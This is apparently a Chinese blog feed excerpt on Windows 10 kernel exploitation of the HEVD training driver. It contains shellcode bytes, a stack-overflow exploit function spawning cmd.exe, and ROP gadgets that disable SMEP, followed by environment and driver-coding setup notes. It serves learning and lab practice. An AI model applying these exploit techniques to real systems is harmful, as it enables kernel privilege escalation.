class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;shellcode space %p\n&quot;</span>, shellcode_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试中手动CR4.SMEP=0（注意，之前已经关闭了KVA）</p><p><img src="https://img.joe1sn.top/uploads/big/23ad38592a7a932722da80062ab27a04.png" alt="img" /></p><h2 id="c-使用内核rop绕过smep"><a class="markdownIt-Anchor" href="#c-使用内核rop绕过smep"></a> C. 使用内核ROP绕过SMEP</h2><p>首先我们需要一个类似于<code>mov rc4,xxx</code>的rop，让<code>rc4.smep=0</code>，</p><p>参考在Linux下进行ROP的经验， payload大致长这样的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_rc4_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure><p>多调试或者编程自动寻找就可以找到了，这里暂时参考<a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">HEVD Exploits – Windows 10 x64 Stack Overflow SMEP Bypass</a></p><p><img src="https://img.joe1sn.top/uploads/big/8de0787e2e202779fce475c08efcd7d0.png" alt="image-20240118154417340" /></p><p><img src="https://img.joe1sn.top/uploads/big/18ad7dc78e36b58f6d1df6045768734e.png" alt="image-20240118154352984" /></p><p>修改EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x840</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807743f52c0</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807749a41cf</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>没有下断点直接过</p><p><img src="https://img.joe1sn.top/uploads/big/263f646ca04327e676129e83d9178406.png" alt="image-20240118154931459" /></p><p><img src="https://img.joe1sn.top/uploads/big/068bbb9c644915e678b8edb21063071b.png" alt="image-20240118154854993" /></p><h1 id="遗留"><a class="markdownIt-Anchor" href="#遗留"></a> 遗留</h1><p>下一篇</p><ul><li>user编程寻找ROPGadget</li><li>shellcode编写</li><li>Token提权</li><li>KVAS</li></ul><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://www.bilibili.com/video/BV1pD4y1a7hP/">https://www.bilibili.com/video/BV1pD4y1a7hP/</a></p><p><a href="https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html">https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html</a></p><p><a href="https://blog.xpnsec.com/hevd-stack-overflow">https://blog.xpnsec.com/hevd-stack-overflow</a></p><p><a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit">https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p><p><a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/</a></p><p><a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p><p><a href="https://wumb0.in/windows-10-kvas-and-software-smep.html">https://wumb0.in/windows-10-kvas-and-software-smep.html</a></p><p><a href="https://github.com/xct/windows-kernel-exploits/">https://github.com/xct/windows-kernel-exploits/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在&lt;a href=&quot;&quot;&gt;上一篇&lt;/a&gt;中了解了与内核的交互模式，这里就可以开始做HEVD了&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13364&quot;&gt;https://xz.aliyun.com/t/13364&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出(上)</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</id>
    <published>2024-01-25T07:07:29.000Z</published>
    <updated>2024-02-24T03:51:35.023Z</updated>
    
    <content type="html"><![CDATA[<p>开始做HEVD来熟悉windows的内核漏洞利用方式时，发现大多数的资料依旧基于windows7，但是目前主流的操作系统已经是win10，所以还是得更上时代潮流的</p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13363">https://xz.aliyun.com/t/13363</a></p><span id="more"></span><h1 id="0-前置环境"><a class="markdownIt-Anchor" href="#0-前置环境"></a> 0. 前置环境</h1><p>更基础</p><ul><li>WIndows10 Vmware虚拟机</li><li>Visual Studio 2019，有WDK</li><li>Windbg Preview（我用单纯是觉得更好看）</li><li>最重要的HEVD项目：<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver%EF%BC%8C%E6%88%91%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E7%9A%843.00">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver，我直接下载的3.00</a> Release版</li></ul><p>我使用的Windows版本是</p><p><img src="https://img.joe1sn.top/uploads/big/a8c845560178af29a6b56e36c93a49cd.png" alt="image-20240122113406037" /></p><h2 id="i-编程环境"><a class="markdownIt-Anchor" href="#i-编程环境"></a> I. 编程环境</h2><p><strong>如果你想快速搭建一个驱动开发环境可以参考B站上的一些资料</strong>，如：<a href="https://www.bilibili.com/video/BV1wY4y1n77F">配置驱动开发环境</a><br />如果按照步骤vs没有<code>KernelModDriver</code>这一模板，找到vs目录的<code>WDK.vsix</code>双击即可</p><p>一段驱动的主要代码，在<code>main.cpp</code>中编写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;win10.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;x64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Running -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>规定了驱动加载和卸载的两个函数，并在加载和卸载时打印调试信息</p><p><img src="https://img.joe1sn.top/uploads/big/16686bd3cbe47610118773f7164f62db.png" alt="image-20240122115841033" /></p><h2 id="ii-调试环境"><a class="markdownIt-Anchor" href="#ii-调试环境"></a> II. 调试环境</h2><h3 id="传统串口调试"><a class="markdownIt-Anchor" href="#传统串口调试"></a> 传统串口调试</h3><p>添加串口</p><img src="https://img.joe1sn.top/uploads/big/39f90005ffe45efbba9a7140e740fee8.png" alt="image-20240115212926345" style="zoom:50%;" /><p>在虚拟机中Win+R召唤<code>msconfig</code>，打开允许串口调试</p><p><img src="https://img.joe1sn.top/uploads/big/78fe2217e7b7b00cfa98a27a83058a01.png" alt="image-20240122114955532" /></p><p>然后在（记得用管理员打开）windbg中按照图中配置即可，其他选项不变</p><p><img src="https://img.joe1sn.top/uploads/big/5b31856f65b981c015c5f5fff5b6b725.png" alt="image-20240122115049006" /></p><p>一直找不到管道的话可以点Break再等会儿就有了</p><p><img src="https://img.joe1sn.top/uploads/big/19d75ecb2fd8950a1a8aba7d70805748.png" alt="img" /></p><h3 id="virtualkd法调试"><a class="markdownIt-Anchor" href="#virtualkd法调试"></a> VirtualKD法调试</h3><p>项目链接：<a href="http://virtualkd.sysprogs.org/">http://virtualkd.sysprogs.org/</a></p><p>安装后，<code>vmmon64.exe</code>就行了</p><p>但是用了就不能用串口调试了</p><p><img src="https://img.joe1sn.top/uploads/big/9c72b6b964eb66c0a1d5e7f45d2a51fc.png" alt="image-20240115222104521" /></p><h3 id="打开信息显示dbgview"><a class="markdownIt-Anchor" href="#打开信息显示dbgview"></a> 打开信息显示+DbgView</h3><p>在<code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\</code>注册表中添加<code>Debug Print Filter</code>，并设置一个<code>Default</code>的<code>DWORD</code>值，你可以将其设置为<code>0x8</code>或者允许更多调试信息的<code>0xf</code></p><p><img src="https://img.joe1sn.top/uploads/big/a71e3dc209c383a939308d3d49b272b0.png" alt="image-20240122114737436" /></p><p>虽然说windbg确实能打印出<code>DbgPrint</code>，但是HEVD使用的是<code>DbgPrintEx</code>，接受不到，安装了DbgView后，他会把调试信息打印出了并且windbg也能收到</p><p><img src="https://img.joe1sn.top/uploads/big/09c9ac07d589f67f1b6fad3b678172e4.png" alt="image-20240122113922891" /></p><h3 id="调试指令"><a class="markdownIt-Anchor" href="#调试指令"></a> 调试指令</h3><p>如果出现了以下情况且虚拟机卡顿，可以使用这两个指令关闭输出</p><p><img src="https://img.joe1sn.top/uploads/big/33f118ae586f66d022e74847ca034c38.png" alt="image-20240122114457173" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; ed nt!Kd_SXS_Mask 0</span><br><span class="line">1: kd&gt; ed nt!Kd_FUSION_Mask 0</span><br></pre></td></tr></table></figure><p><strong>关闭这两个函数的输出，莫名其妙变卡的话再用一下</strong></p><h2 id="iii-驱动加载"><a class="markdownIt-Anchor" href="#iii-驱动加载"></a> III. 驱动加载</h2><p>使用KmdManager.exe，毛子的黑科技，使用时需要管理员启动</p><p>也可以使用osLoader啥的</p><p>这里用KmdKit的KmdManager演示，运行HEVD</p><p><img src="https://img.joe1sn.top/uploads/big/54dbab58e1a08495d2692e00e28164ee.png" alt="image-20240115234008160" /></p><p><img src="https://img.joe1sn.top/uploads/big/5c22ef7ea1a4180500ef95fa027a1ecc.png" alt="image-20240117111218338" /></p><p>那么就算搭建成功</p><h1 id="a-编程基础"><a class="markdownIt-Anchor" href="#a-编程基础"></a> A. 编程基础</h1><p>关于内核模式驱动程序：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/</a></p><p>内核中交互是通过<code>IRP</code>请求进行交互的</p><blockquote><p><strong>IRP</strong> 结构是表示 <em>I/O 请求数据包</em>的部分不透明结构。 <strong>IRP</strong> 结构的未记录成员是保留的，仅由 I/O 管理器使用，在某些情况下，由文件系统驱动程序 (FSD) 使用。</p></blockquote><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp</a></p><p>使用到的内存堆栈为<code>I/O Stack</code></p><blockquote><p>I/O 管理器为分层驱动程序链中的每个驱动程序提供其设置的每个 IRP 的 I/O 堆栈位置。 每个 I/O 堆栈位置都包含 <strong>一个IO_STACK_LOCATION</strong>结构。</p></blockquote><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations</a></p><p><img src="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/images/2irpios.png" alt="说明 irp 中 i/o 堆栈位置的内容的示意图。" /></p><p>IRP通过iostack发送给设备，对应的是应用层的“消息”。设备可以存在（硬盘等），也可以不存在（QQ Protect驱动等）。</p><p>根据上图，应用层通过和设备对象（FDO）进行交互，设备（PDO）再和设备对象交互，实现交互。同时FDO向PDO的交互不是必要的。</p><blockquote><h2 id="hal-硬件抽象层"><a class="markdownIt-Anchor" href="#hal-硬件抽象层"></a> HAL 硬件抽象层</h2><p>HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，名为<code>hal.dll</code>。涉及中断控制器、单处理器/多处理器硬件断点。</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/1e87772ff6bc6d7cc688242870d4b527.png" alt="image-20240116133826071" /></p><h1 id="b-代码"><a class="markdownIt-Anchor" href="#b-代码"></a> B. 代码</h1><p><img src="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/images/driverfunctionpointers01.png" alt="图：driver-object 结构中的函数指针。" /></p><h3 id="创建设备"><a class="markdownIt-Anchor" href="#创建设备"></a> 创建设备</h3><p>MSDN：<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree</a></p><p>使用DeviceTree，可以找到：<a href="https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip">https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip</a></p><p><img src="https://img.joe1sn.top/uploads/big/7e44caefc4f0dd8b3fb72d5422ace35f.png" alt="image-20240116141544394" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING DeviceName = &#123; <span class="number">0</span> &#125;;          <span class="comment">//设备名</span></span><br><span class="line">PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;              <span class="comment">//设备对象</span></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, DEVICE_NAME);</span><br><span class="line">Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevice);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, Status);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建符号链接"><a class="markdownIt-Anchor" href="#创建符号链接"></a> 创建符号链接</h3><p><img src="https://img.joe1sn.top/uploads/big/e4fce5afcd7288e9e8cb6cb95909e77f.png" alt="image-20240116141604421" /></p><p><img src="https://img.joe1sn.top/uploads/big/60c01f30c4f411d81016e83d56d4d96c.png" alt="image-20240116141556022" /></p><p>符号链接就是类似与<code>Z:\</code>之前的前缀</p><p>使用<code>WinObj</code>可以看到，我用的再第一章中下载的<code>KdmKie</code>中的<code>SymLinks</code>（太老了，建议换一个）</p><p><img src="https://img.joe1sn.top/uploads/big/7767beddb14038bf253be19869b69628.png" alt="image-20240116141803859" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING SymLink = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;SymLink, SYM_NAME);</span><br><span class="line">Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;SymLink, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Symbol Link Failed: %x\n&quot;</span>, Status);</span><br><span class="line">    <span class="built_in">IoDeleteDevice</span>(pDevice);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关联功能的交互"><a class="markdownIt-Anchor" href="#关联功能的交互"></a> 关联功能的交互</h3><h4 id="i-创建句柄"><a class="markdownIt-Anchor" href="#i-创建句柄"></a> I. 创建“句柄”</h4><p><img src="https://img.joe1sn.top/uploads/big/bdfd8cc8b7ede9711595ddbd7f5a06f5.png" alt="image-20240116142649799" /></p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs</a></p><p>具体调试方法也在上面的文档中</p><blockquote><p>每个内核模式驱动程序都必须实现名为 <a 